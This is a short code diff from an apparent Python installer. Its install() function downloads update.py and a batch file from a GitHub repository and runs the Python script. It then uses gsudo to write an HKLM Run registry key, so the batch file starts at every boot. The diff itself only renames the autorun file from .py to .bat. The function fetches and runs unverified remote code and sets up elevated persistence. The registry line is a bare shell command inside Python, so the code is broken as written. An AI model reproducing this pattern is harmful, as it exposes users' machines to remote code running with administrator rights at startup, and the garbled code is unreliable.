@@ -11,9 +11,9 @@ def install():
 	url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/update.py'
 	r = requests.get(url, allow_redirects=True)
 	open('c:/julinjutut/update.py', 'wb').write(r.content)
-	url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/autorun.py'
+	url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/autorun.bat'
 	r = requests.get(url, allow_redirects=True)
-	open('c:/julinjutut/autorun.py', 'wb').write(r.content)
+	open('c:/julinjutut/autorun.bat', 'wb').write(r.content)
 	c:/julinjutut/x86/gsudo.exe REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Julinjutut" /t REG_SZ /F /D "C:\julinjutut\autorun.bat"
 	os.system("python3 c:/julinjutut/update.py")
 def start():
